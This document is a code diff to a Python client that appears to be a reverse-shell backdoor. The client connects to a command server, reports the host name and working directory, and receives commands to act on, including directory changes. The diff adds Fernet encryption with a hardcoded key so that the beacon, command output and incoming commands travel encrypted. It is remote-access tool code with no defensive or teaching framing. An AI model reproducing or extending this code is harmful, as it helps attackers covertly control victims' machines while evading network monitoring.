@@ -6,12 +6,23 @@ import signal
 import sys
 import struct
 
+import base64
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
 class Client(object):
 
     def __init__(self):
         self.serverHost = '127.0.0.1'
         self.serverPort = 9999
         self.socket = None
+        # Generate Key
+        # key = Fernet.generate_key()
+
+        key = b'k_1i71JWlLTHt8N185PUXjFFzu27DnEH2sXNy-aoG30='
+        self.Crypt = Fernet(key)
 
     def register_signal_handler(self):
         signal.signal(signal.SIGINT, self.quit_gracefully)
@@ -48,7 +59,8 @@ class Client(object):
             time.sleep(5)
             raise
         try:
-            self.socket.send(str.encode(socket.gethostname()))
+            encrypted_host = self.Crypt.encrypt(socket.gethostname().encode(encoding="utf-8")).decode(encoding="utf-8")
+            self.socket.send(str.encode(encrypted_host))
         except socket.error as e:
             print("Cannot send hostname to server: " + str(e))
             raise
@@ -56,7 +68,7 @@ class Client(object):
 
     def print_output(self, output_str):
         """ Prints command output """
-        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
+        sent_message = str.encode(self.Crypt.encrypt((output_str + str(os.getcwd()) + '> ').encode(encoding='utf-8')).decode())
         self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
         print(output_str)
         return
@@ -68,13 +80,15 @@ class Client(object):
         except Exception as e:
             print('Could not start communication with server: %s\n' %str(e))
             return
-        cwd = str.encode(str(os.getcwd()) + '> ')
+        cwd = str.encode(self.Crypt.encrypt(str(os.getcwd() + '> ').encode()).decode())
         self.socket.send(struct.pack('>I', len(cwd)) + cwd)
         while True:
             output_str = None
             data = self.socket.recv(20480)
-            if data == b'': break
-            elif data[:2].decode("utf-8") == 'cd':
+            if data == b'':
+                break
+            data = self.Crypt.decrypt(data)
+            if data[:2].decode("utf-8") == 'cd':
                 directory = data[3:].decode("utf-8")
                 try:
                     os.chdir(directory.strip())
